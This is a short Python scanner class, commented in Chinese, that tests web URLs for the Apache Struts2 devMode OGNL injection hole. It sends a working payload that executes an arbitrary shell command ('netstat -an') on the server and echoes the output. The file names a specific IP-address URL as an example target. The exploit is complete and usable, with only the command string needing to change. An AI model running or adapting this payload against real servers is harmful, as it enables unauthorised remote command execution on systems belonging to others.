import requests
# url带do或者action
# eg:http://218.75.55.165:8080/szxy/sys_login/login_login.do
class struts2_devmode:
    def __init__(self, url):
        self.url = url

    def attack(self):
        print('test {} --> struts2_devmode'.format(self.url))
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        exp = '''?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=netstat -an'''
        self.url += exp
        try:
            resp = requests.get(self.url, headers=headers, timeout=10)
            if "0.0.0.0" in resp.text:
                return "s2-devmode"
        except:
            #print('test --> struts2_devmode Failed!')
            return None
        return None